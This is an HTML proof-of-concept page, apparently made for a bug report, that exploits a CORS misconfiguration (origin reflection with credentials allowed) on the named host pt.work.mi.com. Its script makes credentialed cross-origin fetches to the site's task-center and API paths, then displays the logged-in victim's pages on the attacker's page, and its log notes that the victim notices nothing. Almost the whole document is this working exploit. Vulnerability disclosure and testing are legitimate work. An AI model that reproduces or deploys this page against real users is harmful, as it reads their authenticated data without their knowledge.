<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CORS PoC - pt.work.mi.com</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Menlo,Monaco,monospace;background:#0d1117;color:#c9d1d9;padding:20px}
h1{color:#58a6ff;font-size:18px;margin-bottom:4px}
.sub{color:#8b949e;font-size:12px;margin-bottom:14px}
#log{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:12px;font-size:12px;line-height:1.6;max-height:520px;overflow-y:auto;white-space:pre-wrap;word-break:break-all}
.ok{color:#7ee787}.info{color:#8b949e}.warn{color:#d2991d}.hl{color:#f0883e}
.ev{background:#0d2b1a;border:1px solid #238636;border-radius:4px;padding:8px;margin:6px 0;max-height:180px;overflow-y:auto;word-break:break-all;color:#7ee787;font-size:11px;line-height:1.4}
.btn{background:#238636;color:#fff;border:none;padding:10px 20px;border-radius:6px;cursor:pointer;font-size:14px}
.btn:hover{background:#2ea043}
</style>
</head>
<body>

<h1>CORS PoC — pt.work.mi.com</h1>
<p class="sub">目标: <b>https://pt.work.mi.com</b> | Origin: <b id="o"></b> | 漏洞: ACAO Origin反射 + ACAC:true</p>
<button class="btn" id="btn" onclick="run()">执行攻击</button>
<div id="log">请先登录 https://pt.work.mi.com 再点击按钮</div>

<script>
var T='https://pt.work.mi.com';
var L=document.getElementById('log');
var B=document.getElementById('btn');
document.getElementById('o').textContent=window.location.origin;
function P(m,c){var s=document.createElement('span');if(c)s.className=c;s.textContent=m;L.appendChild(s);L.appendChild(document.createTextNode('\n'));L.scrollTop=L.scrollHeight}
function E(t,h){var d=document.createElement('div');d.className='ev';d.textContent=h.substring(0,2500);P('');L.appendChild(document.createTextNode('\u25bc '+t+':'));L.appendChild(d);L.scrollTop=L.scrollHeight}

async function run(){
 L.textContent='';
 B.disabled=true;
 B.textContent='执行中...';
 P('═══════════════════════════════','info');
 P('CORS 跨域读取攻击','info');
 P('Origin: '+window.location.origin,'hl');
 P('Target: '+T,'hl');
 P('═══════════════════════════════','info');

 try{
  P('\n[1] 跨域读取主页...','info');
  var r=await fetch(T+'/main-taskcenter-partner',{credentials:'include'});
  var h=await r.text();
  var ti=(h.match(/<title>([^<]*)<\/title>/)||[])[1]||'';
  var de=(h.match(/<meta name="description" content="([^"]*)"/)||[])[1]||'';
  P('HTTP '+r.status+' '+h.length+'B title:"'+ti+'"','ok');
  if(de)P('描述: '+de.substring(0,100),'info');
  E('窃取到的 pt.work.mi.com 完整HTML源码',h);
  P('↑ 跨域读取成功 — 完整HTML已窃取','ok');
 }catch(e){P('失败: '+e.message,'warn')}

 try{
  P('\n[2] 跨域读取任务中心...','info');
  var r2=await fetch(T+'/taskcenter',{credentials:'include'});
  var h2=await r2.text();
  var ti2=(h2.match(/<title>([^<]*)<\/title>/)||[])[1]||'';
  P('HTTP '+r2.status+' '+h2.length+'B title:"'+ti2+'"','ok');
  E('窃取到的任务中心HTML源码',h2);
 }catch(e){P('失败: '+e.message,'warn')}

 try{
  P('\n[3] 跨域读取API...','info');
  var r3=await fetch(T+'/api',{credentials:'include'});
  P('HTTP '+r3.status+' '+((await r3.text()).length)+'B','ok');
 }catch(e){P('失败: '+e.message,'warn')}

 P('\n═══════════════════════════════','info');
 P('攻击成功 — 跨域读取完成','ok');
 P('证据: 不同Origin + HTTP200 + 完整HTML','ok');
 P('→ 后端ACAO反射Origin + ACAC:true','ok');
 P('受害者完全无感知,浏览器无提示','warn');
 P('═══════════════════════════════','info');
 B.disabled=false;
 B.textContent='重新执行';
};
</script>
</body>
</html>
